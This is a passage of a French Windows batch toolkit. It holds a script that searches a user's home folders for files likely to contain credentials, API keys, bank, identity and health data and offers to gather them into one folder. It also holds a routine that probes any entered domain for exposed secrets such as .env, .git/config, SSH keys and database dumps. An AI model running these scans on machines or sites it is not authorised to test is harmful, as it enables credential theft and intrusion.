>> "!DOC_FILE!" echo     'avis_imposition':45, 'hypotheque':40, 'jugement':40, 'notaire':35,
>> "!DOC_FILE!" echo     'avocat':30, 'litige':30, 'emprunt':30, 'pret':30, 'portefeuille':25,
>> "!DOC_FILE!" echo     'diplome':20, 'attestation':20, 'taxe':20,
>> "!DOC_FILE!" echo     'confidentiel':30, 'salaire':30, 'backup':25, 'bulletin':25,
>> "!DOC_FILE!" echo     'paie':25, 'contrat':20, 'facture':20, 'releve':20, 'banque':20,
>> "!DOC_FILE!" echo     'wp-config.php':70, 'config.inc.php':70, 'settings.py':60,
>> "!DOC_FILE!" echo     'web.config':60, 'appsettings.json':60, '.htpasswd':80,
>> "!DOC_FILE!" echo     'authorized_keys':50, 'winscp.ini':50, 'putty.sessions':50,
>> "!DOC_FILE!" echo     'filezilla.xml':50, 'dump.sql':40, 'backup.sql':40, 'export_db':40,
>> "!DOC_FILE!" echo     'vnc_pass':60, 'rdp_details':40, 'serv-u.ini':50,
>> "!DOC_FILE!" echo     'openai.json':60, 'anthropic.yaml':60, 'huggingface_hub':50,
>> "!DOC_FILE!" echo     'firebase-key.json':80, 'service-account.json':90,
>> "!DOC_FILE!" echo     'docker-compose.yml':50, 'kubernetes.yaml':50, 'ansible_vars':60,
>> "!DOC_FILE!" echo     'local.settings.json':60, 'template.env':40, 'config.example':30,
>> "!DOC_FILE!" echo     'settings.template':40, 'deploy.sh':40, 'setup.sql':30
>> "!DOC_FILE!" echo }
>> "!DOC_FILE!" echo EXCLUDE_DIRS = {
>> "!DOC_FILE!" echo     'node_modules','vendor','wp-admin','wp-includes','wp-content',
>> "!DOC_FILE!" echo     '.git','.cxx','intermediates','build','__pycache__',
>> "!DOC_FILE!" echo     'AppData','Temp','Program Files','Windows','bower_components',
>> "!DOC_FILE!" echo     'TEMPLATE','dist','migrations','lang'
>> "!DOC_FILE!" echo }
>> "!DOC_FILE!" echo EXCLUDE_FILES = {
>> "!DOC_FILE!" echo     'package-lock.json','yarn.lock','composer.lock',
>> "!DOC_FILE!" echo     'compile_commands.json','merger.xml','.gitattributes'
>> "!DOC_FILE!" echo }
>> "!DOC_FILE!" echo SKIP_EXTS = {
>> "!DOC_FILE!" echo     '.png','.jpg','.jpeg','.gif','.webp','.svg','.ico',
>> "!DOC_FILE!" echo     '.woff','.woff2','.ttf','.eot','.otf',
>> "!DOC_FILE!" echo     '.mp4','.mp3','.avi','.zip','.rar','.7z',
>> "!DOC_FILE!" echo     '.dll','.exe','.so','.flat','.class','.pyc'
>> "!DOC_FILE!" echo }
>> "!DOC_FILE!" echo EXTS = {'.txt','.csv','.docx','.json','.env','.ini','.conf','.log'}
>> "!DOC_FILE!" echo def check_esc():
>> "!DOC_FILE!" echo     if msvcrt.kbhit():
>> "!DOC_FILE!" echo         if ord(msvcrt.getch()) == 27: return True
>> "!DOC_FILE!" echo     return False
>> "!DOC_FILE!" echo def get_text(p):
>> "!DOC_FILE!" echo     try:
>> "!DOC_FILE!" echo         if p.suffix.lower() == '.docx':
>> "!DOC_FILE!" echo             with zipfile.ZipFile(p) as z: return z.read('word/document.xml').decode('utf-8','ignore')
>> "!DOC_FILE!" echo         return p.read_text(encoding='utf-8', errors='ignore')
>> "!DOC_FILE!" echo     except: return ""
>> "!DOC_FILE!" echo results = []
>> "!DOC_FILE!" echo total_files = 0
>> "!DOC_FILE!" echo print("  Appuyez sur ECHAP pour annuler...", flush=True)
>> "!DOC_FILE!" echo for base in [Path.home()/d for d in ['Documents','Desktop','Downloads','Pictures','OneDrive']]:
>> "!DOC_FILE!" echo     if not base.exists(): continue
>> "!DOC_FILE!" echo     print(f"  [^>] {base.name}...", flush=True)
>> "!DOC_FILE!" echo     dir_count = 0
>> "!DOC_FILE!" echo     for root, dirs, files in os.walk(base):
>> "!DOC_FILE!" echo         if check_esc(): print("\n  [^!] Scan annule."); sys.exit(0)
>> "!DOC_FILE!" echo         dirs[:] = [d for d in dirs if d not in EXCLUDE_DIRS and not d.startswith('.')]
>> "!DOC_FILE!" echo         dir_count += 1
>> "!DOC_FILE!" echo         if dir_count %% 15 == 0: print(f"  [~] {dir_count} dossiers, {total_files} fichiers, {len(results)} hits...   ", end='\r', flush=True)
>> "!DOC_FILE!" echo         for file in files:
>> "!DOC_FILE!" echo             if file.lower() in EXCLUDE_FILES: continue
>> "!DOC_FILE!" echo             if file.endswith('.min.js') or file.endswith('.min.css'): continue
>> "!DOC_FILE!" echo             p = Path(root) / file
>> "!DOC_FILE!" echo             if p.suffix.lower() in SKIP_EXTS: continue
>> "!DOC_FILE!" echo             try:
>> "!DOC_FILE!" echo                 if p.stat().st_size ^> 2000000: continue
>> "!DOC_FILE!" echo             except: continue
>> "!DOC_FILE!" echo             total_files += 1
>> "!DOC_FILE!" echo             score = 0; tags = []
>> "!DOC_FILE!" echo             fname = file.lower()
>> "!DOC_FILE!" echo             if any(x in fname for x in ['example','sample','boilerplate','demo']): continue
>> "!DOC_FILE!" echo             for kw, pts in KW_NAME.items():
>> "!DOC_FILE!" echo                 if kw.startswith('.'):
>> "!DOC_FILE!" echo                     m = kw in fname
>> "!DOC_FILE!" echo                 else:
>> "!DOC_FILE!" echo                     m = bool(re.search(r'\b' + re.escape(kw) + r'\b', fname))
>> "!DOC_FILE!" echo                 if m: score += pts; tags.append(f"NAME:{kw.upper()}")
>> "!DOC_FILE!" echo             if p.suffix.lower() in EXTS:
>> "!DOC_FILE!" echo                 txt = get_text(p)
>> "!DOC_FILE!" echo                 for tname, reg, pts in RULES:
>> "!DOC_FILE!" echo                     if tname == 'CRYPTO' and p.suffix.lower() == '.docx': continue
>> "!DOC_FILE!" echo                     if re.search(reg, txt, re.I): score += pts; tags.append(tname)
>> "!DOC_FILE!" echo             if score ^> 0:
>> "!DOC_FILE!" echo                 results.append({'score':score,'path':str(p),'tags':list(set(tags))})
>> "!DOC_FILE!" echo                 print(f"  [HIT] {p.name}", flush=True)
>> "!DOC_FILE!" echo     print(f"  [OK] {base.name} : {dir_count} dossiers, {total_files} fichiers analyses" + " "*20, flush=True)
>> "!DOC_FILE!" echo results.sort(key=lambda x: x['score'], reverse=True)
>> "!DOC_FILE!" echo TAG_FAMILY = {
>> "!DOC_FILE!" echo     'SSH-KEY':'CREDENTIALS','AWS-KEY':'CREDENTIALS','GOOGLE-API':'CREDENTIALS','DB-PWD':'CREDENTIALS',
>> "!DOC_FILE!" echo     'id_rsa':'CREDENTIALS','credentials':'CREDENTIALS','password':'CREDENTIALS',
>> "!DOC_FILE!" echo     'vault':'CREDENTIALS','api_key':'CREDENTIALS','secret':'CREDENTIALS','token':'CREDENTIALS',
>> "!DOC_FILE!" echo     'PWD-CLEAR':'MOTS-DE-PASSE','mdp':'MOTS-DE-PASSE',
>> "!DOC_FILE!" echo     'IBAN':'RIB-BANCAIRE','rib':'RIB-BANCAIRE','iban':'RIB-BANCAIRE','banque':'RIB-BANCAIRE','releve':'RIB-BANCAIRE',
>> "!DOC_FILE!" echo     'CRYPTO':'CRYPTO',
>> "!DOC_FILE!" echo     'SSN-FR':'IDENTITE','AZURE-KEY':'CLOUD','AZURE-SAS':'CLOUD','HARDCODED-PWD':'CREDENTIALS',
>> "!DOC_FILE!" echo     'FIREBASE':'CLOUD','DOCKER-HUB':'CLOUD','SLACK-TKN':'COMMUNICATION',
>> "!DOC_FILE!" echo     'JDBC-CONN':'BASE-DE-DONNEES','JWT-TOKEN':'CREDENTIALS','WIN-AUTO':'CREDENTIALS',
>> "!DOC_FILE!" echo     'dump.sql':'BASE-DE-DONNEES','backup.sql':'BASE-DE-DONNEES','export_db':'BASE-DE-DONNEES',
>> "!DOC_FILE!" echo     'wp-config.php':'WEB-CONFIG','config.inc.php':'WEB-CONFIG','web.config':'WEB-CONFIG',
>> "!DOC_FILE!" echo     'appsettings.json':'WEB-CONFIG','settings.py':'WEB-CONFIG',
>> "!DOC_FILE!" echo     'filezilla.xml':'FTP-SSH','winscp.ini':'FTP-SSH','putty.sessions':'FTP-SSH',
>> "!DOC_FILE!" echo     'authorized_keys':'FTP-SSH','serv-u.ini':'FTP-SSH',
>> "!DOC_FILE!" echo     'vnc_pass':'CREDENTIALS','rdp_details':'CREDENTIALS','.htpasswd':'CREDENTIALS',
>> "!DOC_FILE!" echo     'passeport':'IDENTITE','carte':'IDENTITE','cni':'IDENTITE','identite':'IDENTITE',
>> "!DOC_FILE!" echo     'titre_sejour':'IDENTITE','permis':'IDENTITE','vital':'IDENTITE',
>> "!DOC_FILE!" echo     'medical':'SANTE','ordonnance':'SANTE','pathologie':'SANTE','mutuelle':'SANTE',
>> "!DOC_FILE!" echo     'avis_imposition':'FINANCE','hypotheque':'FINANCE','jugement':'FINANCE',
>> "!DOC_FILE!" echo     'notaire':'FINANCE','avocat':'FINANCE','litige':'FINANCE',
>> "!DOC_FILE!" echo     'emprunt':'FINANCE','pret':'FINANCE','portefeuille':'FINANCE','taxe':'FINANCE',
>> "!DOC_FILE!" echo     'diplome':'SCOLARITE','attestation':'SCOLARITE',
>> "!DOC_FILE!" echo     'salaire':'PAIE','paie':'PAIE','bulletin':'PAIE',
>> "!DOC_FILE!" echo     'confidentiel':'CONFIDENTIEL',
>> "!DOC_FILE!" echo     'contrat':'DOCUMENTS','facture':'DOCUMENTS','backup':'DOCUMENTS',
>> "!DOC_FILE!" echo     'OPENAI-KEY':'IA-SERVICES','ANTHROPIC':'IA-SERVICES','HF-TOKEN':'IA-SERVICES',
>> "!DOC_FILE!" echo     'CLAUDE-API':'IA-SERVICES','STRIPE-KEY':'IA-SERVICES',
>> "!DOC_FILE!" echo     'openai.json':'IA-SERVICES','anthropic.yaml':'IA-SERVICES','huggingface_hub':'IA-SERVICES',
>> "!DOC_FILE!" echo     'firebase-key.json':'CLOUD','service-account.json':'CLOUD',
>> "!DOC_FILE!" echo     'docker-compose.yml':'DEVOPS','kubernetes.yaml':'DEVOPS','ansible_vars':'DEVOPS',
>> "!DOC_FILE!" echo     'deploy.sh':'DEVOPS','setup.sql':'BASE-DE-DONNEES',
>> "!DOC_FILE!" echo     'template.env':'TEMPLATES','config.example':'TEMPLATES','settings.template':'TEMPLATES',
>> "!DOC_FILE!" echo }
>> "!DOC_FILE!" echo FAM_ORDER = ['IA-SERVICES','CREDENTIALS','CLOUD','DEVOPS','BASE-DE-DONNEES','WEB-CONFIG','FTP-SSH','COMMUNICATION','CRYPTO','RIB-BANCAIRE','MOTS-DE-PASSE','IDENTITE','SANTE','FINANCE','PAIE','SCOLARITE','CONFIDENTIEL','TEMPLATES','DOCUMENTS']
>> "!DOC_FILE!" echo def get_family(tags):
>> "!DOC_FILE!" echo     fams = set()
>> "!DOC_FILE!" echo     for t in tags:
>> "!DOC_FILE!" echo         k = t.replace('NAME:','').lower() if t.startswith('NAME:') else t
>> "!DOC_FILE!" echo         fams.add(TAG_FAMILY.get(k, TAG_FAMILY.get(t, 'AUTRE')))
>> "!DOC_FILE!" echo     for f in FAM_ORDER:
>> "!DOC_FILE!" echo         if f in fams: return f
>> "!DOC_FILE!" echo     return list(fams)[0] if fams else 'AUTRE'
>> "!DOC_FILE!" echo groups = {}
>> "!DOC_FILE!" echo for r in results:
>> "!DOC_FILE!" echo     key = get_family(r['tags'])
>> "!DOC_FILE!" echo     if key not in groups: groups[key] = []
>> "!DOC_FILE!" echo     groups[key].append(r['path'])
>> "!DOC_FILE!" echo if results:
>> "!DOC_FILE!" echo     with open(COPY_PS, 'w', encoding='utf-8-sig') as _cp:
>> "!DOC_FILE!" echo         _cp.write('$base = "!SCRIPT_DIR:\=\\!\\Documents sensibles"\n')
>> "!DOC_FILE!" echo         _cp.write('New-Item -ItemType Directory -Path $base -Force ^| Out-Null' + '\n')
>> "!DOC_FILE!" echo         _cp.write("$i = 1\n")
>> "!DOC_FILE!" echo         _cp.write("$dest = Join-Path $base ('Scan ' + $i)\n")
>> "!DOC_FILE!" echo         _cp.write("while (Test-Path $dest) { $i++; $dest = Join-Path $base ('Scan ' + $i) }\n")
>> "!DOC_FILE!" echo         _cp.write('New-Item -ItemType Directory -Path $dest -Force ^| Out-Null' + '\n')
>> "!DOC_FILE!" echo         _cp.write("Write-Host '  Copie en cours...' -ForegroundColor Cyan\n")
>> "!DOC_FILE!" echo         for tag, paths in groups.items():
>> "!DOC_FILE!" echo             cat_dir = tag.replace(' + ', '-').replace('/', '-')[:40]
>> "!DOC_FILE!" echo             _cp.write(f"$cat = Join-Path $dest '{cat_dir}'\n")
>> "!DOC_FILE!" echo             _cp.write('New-Item -ItemType Directory -Path $cat -Force ^| Out-Null' + '\n')
>> "!DOC_FILE!" echo             seen = {}
>> "!DOC_FILE!" echo             for path in paths:
>> "!DOC_FILE!" echo                 esc = path.replace('`', '``').replace('"', '`"').replace('$', '`$')
>> "!DOC_FILE!" echo                 p = Path(path)
>> "!DOC_FILE!" echo                 base = p.parent.name + ' - ' + p.name
>> "!DOC_FILE!" echo                 cnt = seen.get(base, 0)
>> "!DOC_FILE!" echo                 seen[base] = cnt + 1
>> "!DOC_FILE!" echo                 dest_name = base if cnt == 0 else f"{p.parent.name} - {p.stem} ({cnt}){p.suffix}"
>> "!DOC_FILE!" echo                 ed = dest_name.replace('`', '``').replace('"', '`"').replace('$', '`$')
>> "!DOC_FILE!" echo                 _cp.write(f'Copy-Item -LiteralPath "{esc}" -Destination (Join-Path $cat "{ed}") -ErrorAction SilentlyContinue\n')
>> "!DOC_FILE!" echo             _cp.write("if (-not (Get-ChildItem $cat -ErrorAction SilentlyContinue)) { Remove-Item $cat -Force }\n")
>> "!DOC_FILE!" echo         _cp.write("Write-Host '  [OK] Copies dans :' -ForegroundColor Green\n")
>> "!DOC_FILE!" echo         _cp.write("Write-Host $dest -ForegroundColor Cyan\n")
>> "!DOC_FILE!" echo with open(RES_FILE, 'w', encoding='utf-8') as _f:
>> "!DOC_FILE!" echo     _f.write("=" * 60 + "\n")
>> "!DOC_FILE!" echo     if results:
>> "!DOC_FILE!" echo         _f.write(f"  RESULTATS - {len(results)} fichier(s) detecte(s)\n")
>> "!DOC_FILE!" echo         _f.write("=" * 60 + "\n")
>> "!DOC_FILE!" echo         for tag, paths in groups.items():
>> "!DOC_FILE!" echo             _f.write(f"\n  [{tag}]\n")
>> "!DOC_FILE!" echo             for path in paths:
>> "!DOC_FILE!" echo                 _f.write(f"    {path}\n")
>> "!DOC_FILE!" echo         _f.write("\n" + "=" * 60 + "\n")
>> "!DOC_FILE!" echo     else:
>> "!DOC_FILE!" echo         _f.write("  Aucun document critique detecte.\n")
>> "!DOC_FILE!" echo         _f.write("=" * 60 + "\n")
"!PYCMD!" "!DOC_FILE!"
if %errorlevel% neq 0 (
    echo  [!] Erreur Python - consultez les messages ci-dessus
    pause
    del /f /q "!DOC_FILE!" "!RES_FILE!" "!COPY_PS!" 2>nul
    endlocal
    goto sys_passwords_menu
)
del /f /q "!DOC_FILE!" 2>nul
set "DISP_PS=%TEMP%\disp_%RANDOM%.ps1"
> "!DISP_PS!" echo try { $b=$host.UI.RawUI.BufferSize; $host.UI.RawUI.BufferSize=New-Object Management.Automation.Host.Size($b.Width,3000) } catch {}
>> "!DISP_PS!" echo [Console]::Clear()
>> "!DISP_PS!" echo Get-Content '!RES_FILE!'
>> "!DISP_PS!" echo $host.UI.RawUI.FlushInputBuffer()
>> "!DISP_PS!" echo if (Test-Path '!COPY_PS!') {
>> "!DISP_PS!" echo     $sel = 0
>> "!DISP_PS!" echo     function Show-Choice {
>> "!DISP_PS!" echo         param($s)
>> "!DISP_PS!" echo         $c = $host.UI.RawUI.CursorPosition; $c.X = 0; $host.UI.RawUI.CursorPosition = $c
>> "!DISP_PS!" echo         Write-Host "  Copier ces fichiers dans 'Documents sensibles' ?  " -NoNewline
>> "!DISP_PS!" echo         if ($s -eq 0) { Write-Host " OUI " -NoNewline -ForegroundColor Black -BackgroundColor Green; Write-Host "   NON  " -ForegroundColor DarkGray }
>> "!DISP_PS!" echo         else { Write-Host " OUI " -NoNewline -ForegroundColor DarkGray; Write-Host "   NON  " -ForegroundColor Black -BackgroundColor Red }
>> "!DISP_PS!" echo     }
>> "!DISP_PS!" echo     Write-Host ""
>> "!DISP_PS!" echo     Show-Choice $sel
>> "!DISP_PS!" echo     while ($true) {
>> "!DISP_PS!" echo         $k = [Console]::ReadKey($true)
>> "!DISP_PS!" echo         if ($k.Key -eq 'LeftArrow' -or $k.Key -eq 'RightArrow') {
>> "!DISP_PS!" echo             $sel = 1 - $sel
>> "!DISP_PS!" echo             $c = $host.UI.RawUI.CursorPosition; $c.Y--; $host.UI.RawUI.CursorPosition = $c
>> "!DISP_PS!" echo             Show-Choice $sel
>> "!DISP_PS!" echo         } elseif ($k.Key -eq 'Enter') { break }
>> "!DISP_PS!" echo         elseif ($k.Key -eq 'Escape') { $sel = 1; break }
>> "!DISP_PS!" echo     }
>> "!DISP_PS!" echo     if ($sel -eq 0) { ^& '!COPY_PS!'; Write-Host "`n  Appuyez sur une touche..." ; [Console]::ReadKey($true) ^| Out-Null }
>> "!DISP_PS!" echo     else { Write-Host "`n  Retour au menu." }
>> "!DISP_PS!" echo } else {
>> "!DISP_PS!" echo     Write-Host "`n  Appuyez sur une touche pour revenir au menu..."
>> "!DISP_PS!" echo     [Console]::ReadKey($true) ^| Out-Null
>> "!DISP_PS!" echo }
powershell -NoProfile -ExecutionPolicy Bypass -File "!DISP_PS!"
del /f /q "!DISP_PS!" "!RES_FILE!" "!COPY_PS!" 2>nul
endlocal
goto sys_passwords_menu




:scan_web_routes
setlocal enabledelayedexpansion
cls
echo.
echo  +------------------------------------------------------+
echo  ^|        AUDIT DE SECURITE WEB - V10.0                ^|
echo  ^|   GEO-IP + SSL + HEADERS + 70 ROUTES SENSIBLES      ^|
echo  +------------------------------------------------------+
echo.
set "TARGET_URL="
set /p "TARGET_URL=  Domaine (ex: salutalex.fr) : "
if "!TARGET_URL!"=="" goto scan_web_routes

set "DOMAIN=!TARGET_URL!"
set "DOMAIN=!DOMAIN:https://=!"
set "DOMAIN=!DOMAIN:http://=!"
for /f "tokens=1 delims=/" %%a in ("!DOMAIN!") do set "DOMAIN=%%a"

echo.
echo  [*] Lancement de l'audit pour !DOMAIN!...
echo.

set "SCAN_PS=%TEMP%\web_scan_%RANDOM%.ps1"

> "!SCAN_PS!" echo [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
>> "!SCAN_PS!" echo [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
>> "!SCAN_PS!" echo $domain = '!DOMAIN!'
>> "!SCAN_PS!" echo $routes  = @('/.env','/.env.local','/.env.production','/.env.backup','/.env.example','/.env.dev')
>> "!SCAN_PS!" echo $routes += @('/wp-config.php','/wp-config.php.bak','/wp-config.php~','/wp-config-sample.php')
>> "!SCAN_PS!" echo $routes += @('/.htaccess','/.htpasswd','/.git/config','/.git/HEAD','/.gitignore','/.gitattributes')
>> "!SCAN_PS!" echo $routes += @('/backup.sql','/db.sql','/database.sql','/dump.sql','/data.sql','/mysql.sql')
>> "!SCAN_PS!" echo $routes += @('/backup.zip','/backup.tar.gz','/www.zip','/site.zip','/old.zip','/archive.zip')
>> "!SCAN_PS!" echo $routes += @('/phpinfo.php','/info.php','/test.php','/debug.php','/shell.php','/cmd.php')
>> "!SCAN_PS!" echo $routes += @('/robots.txt','/sitemap.xml','/crossdomain.xml','/security.txt','/.well-known/security.txt')
>> "!SCAN_PS!" echo $routes += @('/api','/api/v1','/api/v2','/api/v3','/api/users','/api/admin','/api/config','/api/keys','/api/tokens')
>> "!SCAN_PS!" echo $routes += @('/admin','/administrator','/admin/','/backend','/manage','/management','/console')
>> "!SCAN_PS!" echo $routes += @('/wp-admin','/wp-login.php','/wp-json/wp/v2/users','/wp-content/debug.log')
>> "!SCAN_PS!" echo $routes += @('/login','/signin','/dashboard','/panel','/cpanel','/webmail','/roundcube')
>> "!SCAN_PS!" echo $routes += @('/phpmyadmin','/pma','/mysql','/adminer.php','/dbadmin')
>> "!SCAN_PS!" echo $routes += @('/server-status','/server-info','/_profiler','/actuator')
>> "!SCAN_PS!" echo $routes += @('/actuator/health','/actuator/env','/actuator/beans','/actuator/mappings','/actuator/metrics')
>> "!SCAN_PS!" echo $routes += @('/.DS_Store','/.bash_history','/.ssh/id_rsa','/.ssh/authorized_keys','/.ssh/known_hosts')
>> "!SCAN_PS!" echo $routes += @('/web.config','/config.php','/settings.php','/config.yml','/config.yaml','/config.json')
>> "!SCAN_PS!" echo $routes += @('/package.json','/composer.json','/requirements.txt','/Dockerfile','/docker-compose.yml')
>> "!SCAN_PS!" echo $routes += @('/swagger.json','/swagger-ui.html','/api-docs','/openapi.json','/openapi.yaml')
>> "!SCAN_PS!" echo $routes += @('/graphql','/graphiql','/__graphql','/v1/graphql')
>> "!SCAN_PS!" echo $routes += @('/uploads','/upload','/files','/static/uploads','/media')
>> "!SCAN_PS!" echo $routes += @('/logs','/log','/error.log','/access.log','/debug.log','/app.log')
>> "!SCAN_PS!" echo $routes += @('/.svn/entries','/.hg/hgrc','/CVS/Root','/trace.axd','/elmah.axd')
>> "!SCAN_PS!" echo $routes += @('/metrics','/health','/healthz','/readyz','/status','/ping','/version','/info')
>> "!SCAN_PS!" echo # GEO-IP
>> "!SCAN_PS!" echo try {
>> "!SCAN_PS!" echo   $ip = ([System.Net.Dns]::GetHostAddresses($domain) ^| Select-Object -First 1).IPAddressToString
>> "!SCAN_PS!" echo   Write-Host ('  IP          : ' + $ip) -ForegroundColor White
>> "!SCAN_PS!" echo   $geo = Invoke-RestMethod ('https://ipinfo.io/' + $ip + '/json') -TimeoutSec 5
>> "!SCAN_PS!" echo   Write-Host ('  Org/AS      : ' + $geo.org) -ForegroundColor Cyan
>> "!SCAN_PS!" echo   Write-Host ('  Localisation: ' + $geo.city + ', ' + $geo.region + ', ' + $geo.country) -ForegroundColor Cyan
>> "!SCAN_PS!" echo   if ($geo.hostname) { Write-Host ('  Hostname    : ' + $geo.hostname) -ForegroundColor DarkGray }
>> "!SCAN_PS!" echo } catch { Write-Host ('  [!] GeoIP : ' + $_.Exception.Message.Split([char]10)[0]) -ForegroundColor Red }
>> "!SCAN_PS!" echo # SOUS-DOMAINES SSL
>> "!SCAN_PS!" echo Write-Host '' ; Write-Host '  --- SOUS-DOMAINES (crt.sh) ---' -ForegroundColor DarkCyan
>> "!SCAN_PS!" echo $targets = @('https://' + $domain)
>> "!SCAN_PS!" echo try {
>> "!SCAN_PS!" echo   $crtUrl = 'https://crt.sh/?q=%%25.' + $domain + '^&output=json'
>> "!SCAN_PS!" echo   $json = Invoke-RestMethod $crtUrl -TimeoutSec 15
>> "!SCAN_PS!" echo   $realSubs = $json.common_name ^| Select-Object -Unique ^| Where-Object { $_ -ne $domain -and $_ -notmatch '^\*' }
>> "!SCAN_PS!" echo   if ($realSubs) {
>> "!SCAN_PS!" echo     foreach ($s in $realSubs) { Write-Host ('  [+] ' + $s) -ForegroundColor Green ; $targets += ('https://' + $s) }
>> "!SCAN_PS!" echo   } else { Write-Host '  [-] Aucun sous-domaine public.' -ForegroundColor DarkGray }
>> "!SCAN_PS!" echo } catch { Write-Host ('  [!] crt.sh : ' + $_.Exception.Message.Split([char]10)[0]) -ForegroundColor Yellow }
>> "!SCAN_PS!" echo # AUDIT PAR CIBLE
>> "!SCAN_PS!" echo foreach ($t in ($targets ^| Select-Object -Unique)) {
>> "!SCAN_PS!" echo   Write-Host '' ; Write-Host ('  ^>^>^> AUDIT : ' + $t) -ForegroundColor Cyan -BackgroundColor DarkBlue
>> "!SCAN_PS!" echo   try {
>> "!SCAN_PS!" echo     $req = [System.Net.HttpWebRequest]::Create($t)
>> "!SCAN_PS!" echo     $req.Method = 'GET' ; $req.Timeout = 6000 ; $req.UserAgent = 'Mozilla/5.0' ; $req.AllowAutoRedirect = $false
>> "!SCAN_PS!" echo     try { $res = $req.GetResponse() } catch [System.Net.WebException] { $res = $_.Exception.Response }
>> "!SCAN_PS!" echo     if ($res) {
>> "!SCAN_PS!" echo       $h = $res.Headers
>> "!SCAN_PS!" echo       $srv = $h['Server'] ; $xpow = $h['X-Powered-By']
>> "!SCAN_PS!" echo       if ($srv)  { Write-Host ('  Serveur     : ' + $srv) -ForegroundColor White }
>> "!SCAN_PS!" echo       if ($xpow) { Write-Host ('  Technologie : ' + $xpow) -ForegroundColor White }
>> "!SCAN_PS!" echo       Write-Host '  -- En-tetes securite --' -ForegroundColor DarkGray
>> "!SCAN_PS!" echo       foreach ($hdr in @('Strict-Transport-Security','Content-Security-Policy','X-Frame-Options','X-Content-Type-Options','Referrer-Policy','Permissions-Policy')) {
>> "!SCAN_PS!" echo         if ($h[$hdr]) { Write-Host ('  [OK] ' + $hdr) -ForegroundColor Green } else { Write-Host ('  [!!] MANQUANT : ' + $hdr) -ForegroundColor Yellow }
>> "!SCAN_PS!" echo       }
>> "!SCAN_PS!" echo       $res.Close()
>> "!SCAN_PS!" echo     }
>> "!SCAN_PS!" echo   } catch { Write-Host ('  [!] Connexion : ' + $_.Exception.Message.Split([char]10)[0]) -ForegroundColor Red }
>> "!SCAN_PS!" echo   Write-Host '' ; Write-Host ('  -- Scan des ' + $routes.Count + ' routes --') -ForegroundColor DarkGray
>> "!SCAN_PS!" echo   $found = 0
>> "!SCAN_PS!" echo   foreach ($r in $routes) {
>> "!SCAN_PS!" echo     try {
>> "!SCAN_PS!" echo       $sreq = [System.Net.HttpWebRequest]::Create($t + $r)
>> "!SCAN_PS!" echo       $sreq.Method = 'GET' ; $sreq.Timeout = 2000 ; $sreq.AllowAutoRedirect = $false ; $sreq.UserAgent = 'Mozilla/5.0'
>> "!SCAN_PS!" echo       $sres = $sreq.GetResponse()
>> "!SCAN_PS!" echo       $code = [int]$sres.StatusCode ; $sres.Close()
>> "!SCAN_PS!" echo       if     ($code -eq 200)                { Write-Host ('    [EXPOSE]   200 ' + $r) -ForegroundColor Red     ; $found++ }
>> "!SCAN_PS!" echo       elseif ($code -in @(301,302,307,308)) { Write-Host ('    [REDIRECT] ' + $code + ' ' + $r) -ForegroundColor Yellow  ; $found++ }
>> "!SCAN_PS!" echo       elseif ($code -eq 403)                { Write-Host ('    [PROTEGE]  403 ' + $r) -ForegroundColor Green   ; $found++ }
>> "!SCAN_PS!" echo       elseif ($code -eq 500)                { Write-Host ('    [ERREUR]   500 ' + $r) -ForegroundColor Magenta ; $found++ }
>> "!SCAN_PS!" echo     } catch [System.Net.WebException] {
>> "!SCAN_PS!" echo       if ($_.Exception.Response) {
>> "!SCAN_PS!" echo         $c2 = [int]$_.Exception.Response.StatusCode
>> "!SCAN_PS!" echo         if     ($c2 -eq 403)                { Write-Host ('    [PROTEGE]  403 ' + $r) -ForegroundColor Green   ; $found++ }
>> "!SCAN_PS!" echo         elseif ($c2 -eq 500)                { Write-Host ('    [ERREUR]   500 ' + $r) -ForegroundColor Magenta ; $found++ }
>> "!SCAN_PS!" echo         elseif ($c2 -in @(301,302,307,308)) { Write-Host ('    [REDIRECT] ' + $c2 + ' ' + $r) -ForegroundColor Yellow  ; $found++ }
>> "!SCAN_PS!" echo       }
>> "!SCAN_PS!" echo     } catch {}
>> "!SCAN_PS!" echo   }
>> "!SCAN_PS!" echo   if ($found -eq 0) { Write-Host '  [-] Aucune route notable (toutes en 404/timeout).' -ForegroundColor DarkGray }
>> "!SCAN_PS!" echo }
>> "!SCAN_PS!" echo $sel = 1
>> "!SCAN_PS!" echo function Show-Choice {
>> "!SCAN_PS!" echo     param($s)
>> "!SCAN_PS!" echo     $c = $host.UI.RawUI.CursorPosition; $c.X = 0; $host.UI.RawUI.CursorPosition = $c
>> "!SCAN_PS!" echo     Write-Host "  Tester une autre URL ?  " -NoNewline
>> "!SCAN_PS!" echo     if ($s -eq 0) { Write-Host " OUI " -NoNewline -ForegroundColor Black -BackgroundColor Green; Write-Host "   NON  " -ForegroundColor DarkGray }
>> "!SCAN_PS!" echo     else          { Write-Host " OUI " -NoNewline -ForegroundColor DarkGray;                    Write-Host "   NON  " -ForegroundColor Black -BackgroundColor Red }
>> "!SCAN_PS!" echo }
>> "!SCAN_PS!" echo Write-Host ""
>> "!SCAN_PS!" echo Show-Choice $sel
>> "!SCAN_PS!" echo while ($true) {
>> "!SCAN_PS!" echo     $k = [Console]::ReadKey($true)
>> "!SCAN_PS!" echo     if ($k.Key -eq 'LeftArrow' -or $k.Key -eq 'RightArrow') {
>> "!SCAN_PS!" echo         $sel = 1 - $sel
>> "!SCAN_PS!" echo         $c = $host.UI.RawUI.CursorPosition; $c.Y--; $host.UI.RawUI.CursorPosition = $c
>> "!SCAN_PS!" echo         Show-Choice $sel
>> "!SCAN_PS!" echo     } elseif ($k.Key -eq 'Enter') { break }
>> "!SCAN_PS!" echo     elseif ($k.Key -eq 'Escape') { $sel = 1; break }
>> "!SCAN_PS!" echo }
>> "!SCAN_PS!" echo Write-Host ""
>> "!SCAN_PS!" echo if ($sel -eq 0) { exit 1 } else { exit 0 }

powershell -NoProfile -ExecutionPolicy Bypass -File "!SCAN_PS!"
set "RES=%errorlevel%"
del /f /q "!SCAN_PS!" 2>nul
if "!RES!"=="1" (endlocal & goto scan_web_routes)
endlocal
goto sys_passwords_menu


::--------------------------------------------------------------
:: Subroutine : Verifie/installe Python, expose PYCMD ou PYERR
::--------------------------------------------------------------
:ensure_python
set "PYCMD=" & set "PYERR="

REM 1. Tester d'abord le lanceur officiel Python 'py'
py --version >nul 2>&1
if !errorlevel! equ 0 (
    set "PYCMD=py"
    goto :eof
)

REM 2. Tester 'where python' en ignorant les stubs d'execution WindowsApps
for /f "delims=" %%p in ('where python 2^>nul') do (
    if not defined PYCMD (
        echo %%p | findstr /i "WindowsApps" >nul
